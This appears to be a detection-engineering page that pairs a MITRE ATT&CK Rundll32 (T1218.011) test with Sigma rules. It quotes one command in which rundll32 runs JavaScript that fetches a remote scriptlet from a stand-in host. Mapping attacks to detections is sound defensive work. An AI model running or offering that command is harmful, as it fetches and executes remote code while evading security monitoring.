
[back](../index.md)

Find sigma rule :heavy_check_mark: 

# Attack: Rundll32 

Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

# MITRE
## Tactic
  - defense-evasion


## technique
  - T1218.011


# Test : Rundll32 execute JavaScript Remote Payload With GetObject
## OS
  - windows


## Description:
Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened.


# Sigma Rule
 - win_pc_susp_rundll32_script_run.yml (id: 73fcad2e-ff14-4c38-b11d-4172c8ac86c7)

 - win_run_executable_invalid_extension.yml (id: c3a99af4-35a9-4668-879e-c09aeb4f2bdf)

 - sysmon_rundll32_net_connections.yml (id: cdc8da7d-c303-42f8-b08c-b4ab47230263)

 - sysmon_win_binary_github_com.yml (id: 635dbb88-67b3-4b41-9ea5-a3af2dd88153)



[back](../index.md)
